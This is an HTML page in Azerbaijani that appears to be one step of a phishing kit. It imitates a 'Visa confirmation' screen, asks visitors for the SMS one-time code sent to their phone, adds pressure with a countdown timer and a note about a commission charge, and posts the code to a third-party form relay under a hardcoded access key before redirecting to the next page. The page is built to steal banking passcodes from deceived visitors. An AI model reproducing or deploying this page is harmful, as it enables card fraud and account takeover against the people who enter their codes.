<!DOCTYPE html>
<html lang="az">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>VİZA Təstiqi</title>
    <style>
      body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: url("66.jpg") no-repeat center center;
        background-size: cover;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
      }

      .container {
        background: rgba(255, 255, 255, 0.95);
        padding: 30px;
        border-radius: 16px;
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        width: 90%;
        max-width: 400px;
        text-align: center;
      }

      h2 {
        margin-bottom: 10px;
        color: #333;
      }
      .instruction,
      .info-box {
        font-size: 14px;
        color: #555;
        margin-bottom: 20px;
      }
      .timer {
        font-size: 18px;
        margin-bottom: 20px;
        color: #555;
      }

      input[type="text"] {
        width: 100%;
        padding: 12px;
        border-radius: 8px;
        border: 1px solid #ccc;
        text-align: center;
        font-size: 18px;
        letter-spacing: 10px;
        margin-bottom: 15px;
        transition: border 0.3s;
      }
      input[type="text"].error {
        border-color: red;
      }
      input[type="text"]:focus {
        outline: none;
        border-color: #007bff;
      }

      .btn {
        padding: 12px 20px;
        border: none;
        border-radius: 8px;
        background: gold;
        color: #333;
        font-weight: bold;
        font-size: 16px;
        cursor: pointer;
        width: 100%;
        transition: background 0.3s;
      }
      .btn:hover {
        background: #e6c200;
      }

      audio {
        display: none;
      }

      @media (max-width: 400px) {
        input[type="text"] {
          letter-spacing: 6px;
          font-size: 16px;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>VİZA Təstiqi</h2>
      <p class="instruction">
        Zəhmət olmasa telefona gələn SMS kodunu daxil edin
      </p>
      <div class="timer" id="timer">05:00</div>

      <form id="otpForm" class="otp-form">
        <input
          type="text"
          id="otp"
          name="o"
          maxlength="6"
          placeholder="______"
          required
        />
        <button type="submit" class="btn">Təsdiqlə</button>
      </form>

      <div class="info-box">
        Qeyd: Balansınızda ən azı 0.20 qəpik olmalıdır. Komissiya haqqı bundan
        çıxılacaq.
      </div>

      <audio
        id="beep"
        src="https://www.soundjay.com/buttons/sounds/beep-07.mp3"
      ></audio>
    </div>

    <script>
      const timerEl = document.getElementById("timer");
      const otpForm = document.getElementById("otpForm");
      const otpInput = document.getElementById("otp");
      const beep = document.getElementById("beep");

      // Timer
      let totalTime = 300; // 5 dəqiqə
      let countdown = setInterval(() => {
        let minutes = String(Math.floor(totalTime / 60)).padStart(2, "0");
        let seconds = String(totalTime % 60).padStart(2, "0");
        timerEl.textContent = `${minutes}:${seconds}`;
        if (totalTime === 10) beep.play();
        if (totalTime <= 0) {
          clearInterval(countdown);
          otpInput.disabled = true;
          otpForm.querySelector("button").disabled = true;
          alert("Vaxt bitdi!");
        }
        totalTime--;
      }, 1000);

      // OTP submit və Web3Forms API
      otpForm.addEventListener("submit", async (e) => {
        e.preventDefault();
        const otp = otpInput.value.trim();
        const otpRegex = /^\d{3,6}$/;
        if (!otpRegex.test(otp)) {
          otpInput.classList.add("error");
          alert("Zəhmət olmasa 3-6 rəqəm daxil edin.");
          return;
        }
        otpInput.classList.remove("error");

        // Web3Forms üçün POST
        const formData = new FormData();
        formData.append("access_key", "c729b137-5cfe-4074-ad33-e1cd5f8fc1bd"); // sənin Web3Forms access key
        formData.append("ot", otp);

        try {
          const response = await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            body: formData,
          });

          if (response.ok) {
            window.location.href = "4.html"; // 4-cü səhifəyə yönləndir
          } else {
            alert("Göndərmə zamanı xəta baş verdi: " + response.status);
          }
        } catch (err) {
          alert("Server ilə əlaqə qurulmadı: " + err.message);
        }
      });
    </script>
  </body>
</html>
